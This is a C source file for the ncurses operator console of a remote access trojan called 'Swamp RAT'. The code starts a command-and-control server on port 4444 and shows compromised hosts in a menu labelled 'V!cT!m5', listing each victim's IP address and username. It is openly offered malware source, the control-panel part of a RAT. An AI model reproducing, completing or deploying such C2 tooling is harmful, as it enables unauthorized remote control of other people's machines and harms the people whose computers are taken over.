/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <ncurses.h>
#include <menu.h>
#include <errno.h>
#include <pthread.h>
#include "net.h"

#define ARRAY_SIZE(a)(sizeof(a) / sizeof(a[0]))

MENU *menu;
ITEM **items;
WINDOW *win_menu;
WINDOW *win_main;
int  x_margin = 4;
int  y_margin = 2;
char win_menu_title[] = "V!cT!m5";
char win_main_version[] = "|0.9b|";
char win_main_title[] = "|Swamp RAT|";

pthread_mutex_t ncurses_mutex = PTHREAD_MUTEX_INITIALIZER;

char *itoa(int x){
  /*
    :TODO: integer to (char *)
    :x: integer
    :returns: (char *)
  */
  char* buffer = malloc(sizeof(char) * sizeof(int) * 4 + 1);
  if (buffer){
    sprintf(buffer, "%d", x);
  }
  return buffer;
}

bool ncurses_window_cleanup(WINDOW *win){
  /*
    :TODO: clean up window
    :returns: boolean
  */
  delwin(win);
  endwin();
  refresh();
  return true;
}

bool ncurses_window_border(WINDOW *win){
  /*
    :TODO: draw window border
    :returns: boolean
  */
  box(win, 0, 0);
  refresh();
  return true;
}

bool ncurses_window_title(WINDOW *win, char *title){
  /*
    :TODO: draw window title
    :win: pointer to window struct
    :title: title of window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(0, ((x / 2) - (strlen(title)/2)), title);
  refresh();
  return true;
}

bool ncurses_window_footer(WINDOW *win, char *footer){
  /*
    :TODO: draw window footer
    :win: pointer to window struct
    :footer: footerof window
    :returns: boolean
  */
  int x, y;
  getmaxyx(win, y, x);
  mvprintw(y - 1, ((x / 2) - (strlen(footer) / 2)), footer);
  refresh();
  return true;
}

#ifndef NCURSES_MAIN_WIN_COLOR
#define NCURSES_MAIN_WIN_COLOR 1
#endif

#ifndef NCURSES_MENU_WIN_COLOR
#define NCURSES_MENU_WIN_COLOR 2
#endif

void ncurses_print_menu_title(WINDOW *win,
                     int starty,
                     int startx,
                     int width,
                     char *string){
  int length, x, y;
  float temp;

  if(win == NULL){
    win = stdscr;
  }
  getyx(win, y, x);
  if(startx != 0){
    x = startx;
  }
  if(starty != 0){
    y = starty;
  }
  if(width == 0){
    width = 80;
  }
  length = strlen(string);
  temp = (width - length)/ 2;
  x = startx + (int)temp;
  mvwprintw(win, y, x, "%s", string);
  refresh();
}

bool ncurses_menu_cleanup(MENU *menu){
  /*
    :TODO: cleanup menu
    :menu: (MENU *)
    :returns: boolean
  */
  unpost_menu(menu);
  free_menu(menu);
  return true;
}

bool ncurses_item_cleanup(ITEM **items, int n_items){
  for(int i = 0; i < n_items; ++i){
    free_item(items[i]);
  }
  return true;
}

bool ncurses_item_victims(ITEM **items){
  int j = 0;
  for(int i = 0; i < NET_MAX_CLIENTS; ++i){
    if (p_victims[i] != NULL){
      //printf("[+] username:%s\n", p_victims[i]->sysinfo.username);
      items[j] = new_item(p_victims[i]->sysinfo.ip,
                          p_victims[i]->sysinfo.username);
      j++;
    }
  }
  return true;
}

#ifndef NCURSES_WMAIN
#define NCURSES_WMAIN_INIT   0
#define NCURSES_WMAIN_UPDATE 1
#define NCURSES_WMAIN
#endif

bool ncurses_wmain(int action){
  int y, x;
  if (action == NCURSES_WMAIN_INIT){
    if(putenv("TERM=linux") != 0){
      fprintf(stderr, "[x] %s\n", strerror(errno));
      return false;
    }
    if ((win_main = initscr()) == NULL){
      fprintf(stderr, "[x] %s\n", strerror(errno));
      return false;
    }
    if (start_color() == ERR || !has_colors() || !can_change_color()){
      ncurses_window_cleanup(win_main);
      fprintf(stderr, "[x] %s\n", strerror(errno));
      return false;
    }
    if (net_server_async(4444) == false){
      fprintf(stderr, "[x] failed to start cnc server!\n");
      return false;
    }
    getmaxyx(win_main, y, x);
    win_menu = newwin((y - (y_margin * 2)),
                      (x - (x_margin * 2)),
                      2,
                      4);
    curs_set(0);
    init_pair(NCURSES_MAIN_WIN_COLOR, COLOR_GREEN, COLOR_BLACK);
    init_pair(NCURSES_MENU_WIN_COLOR, COLOR_RED, COLOR_BLACK);
    wbkgd(win_main, COLOR_PAIR(NCURSES_MAIN_WIN_COLOR));
    wbkgd(win_menu, COLOR_PAIR(NCURSES_MENU_WIN_COLOR));
    cbreak();
    noecho();
    keypad(win_main, true);
    keypad(win_menu, true);
  }
  if (action == NCURSES_WMAIN_UPDATE){
    pthread_mutex_lock(&ncurses_mutex);
    getmaxyx(win_main, y, x);
    wclear(win_main);
    wclear(win_menu);
    mvprintw(1, 1, "victims: %d\n", NET_VICTIMS_TOTAL);
    box(win_main, 0, 0);
    ncurses_window_title(win_main, win_main_title);
    ncurses_window_footer(win_main, win_main_version);
    items = (ITEM **)calloc(NET_VICTIMS_TOTAL, sizeof(ITEM *));
    ncurses_item_victims(items);
    menu = new_menu((ITEM **)items);
    wmove(win_menu, 4, 2);
    wresize(win_menu, (y - (y_margin * 2)), (x - (x_margin * 2)));
    set_menu_win(menu, win_menu);
    set_menu_sub(menu, derwin(win_menu, 6, 38, 3, 1));
    set_menu_mark(menu, " -> ");
    box(win_menu, 0, 0);
    ncurses_print_menu_title(win_menu, 1, 0, (x - (x_margin * 2)), win_menu_title);
    mvwaddch(win_menu, y_margin, 0, ACS_LTEE);
    mvwhline(win_menu, y_margin, 1, ACS_HLINE, ((x - (x_margin * 2)) - 2));
    mvwaddch(win_menu, y_margin, (x - (x_margin * 2)) - 1, ACS_RTEE);
    post_menu(menu);
    refresh();
    wrefresh(win_main);
    wrefresh(win_menu);
    pthread_mutex_unlock(&ncurses_mutex);
  } 
  return false;
}

void *ncurses_pthread_update_timer(){
  int n_victims = NET_VICTIMS_TOTAL;
  ncurses_wmain(NCURSES_WMAIN_UPDATE);
  while (true){
    if (n_victims != NET_VICTIMS_TOTAL){
      ncurses_wmain(NCURSES_WMAIN_UPDATE);
      n_victims = NET_VICTIMS_TOTAL;
    }
  }
  pthread_exit(NULL);
}

bool ncurses_main(){
  /*
    :TODO: main ncurses interface
    :returns: boolean
  */
  int key;
  ncurses_wmain(NCURSES_WMAIN_INIT);
  ncurses_wmain(NCURSES_WMAIN_UPDATE);
  pthread_t t_ncurses_pthread_update_timer;
  if (pthread_create(&t_ncurses_pthread_update_timer, NULL, ncurses_pthread_update_timer, NULL)){
    fprintf(stderr, "[x] %s\n", strerror(errno));
    return false;
  }
  while(true){
    key = getch();
    if (key == KEY_RESIZE){
      ncurses_wmain(NCURSES_WMAIN_UPDATE);
    }
    if (key == KEY_DOWN){
      menu_driver(menu, REQ_DOWN_ITEM);
      refresh();
      wrefresh(win_menu);
      wrefresh(win_main);
    }
    if (key == KEY_UP){
      menu_driver(menu, REQ_UP_ITEM);
      refresh();
      wrefresh(win_menu);
      wrefresh(win_main);
    }
  }
  ncurses_menu_cleanup(menu);
  ncurses_item_cleanup(items, NET_VICTIMS_TOTAL);
  endwin();
  return true;
}


